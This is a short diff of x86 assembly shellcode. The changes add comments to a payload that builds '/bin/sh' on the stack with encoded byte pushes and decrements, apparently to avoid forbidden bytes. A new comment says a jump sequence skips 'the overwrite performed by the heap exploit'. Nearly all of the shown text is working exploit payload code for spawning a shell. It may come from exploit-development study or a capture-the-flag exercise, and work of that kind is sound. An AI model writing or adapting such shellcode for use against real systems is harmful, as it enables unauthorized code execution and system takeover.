@@ -5,6 +5,7 @@
 	pop edx
 	dec edx ; this also sets ZF = 0
 
+	; jump and "nops" to get past the overwrite performed by the heap exploit
 	jz short +0x13
 	inc ecx
 	inc ecx
@@ -24,15 +25,15 @@
 	inc ecx
 
 	; filename = "/bin/sh"
-	push byte 0x68
-	push word 0x7330
+	push byte 0x68 ; "h"
+	push word 0x7330 ; "0s"
 	pop ebx
-	dec ebx
+	dec ebx ; "/sh"
 	push ebx
 
-	push dword 0x6e696230
+	push dword 0x6e696230 ; "0bin"
 	pop ebx
-	dec ebx
+	dec ebx ; "/bin"
 	push ebx
 
 	push esp
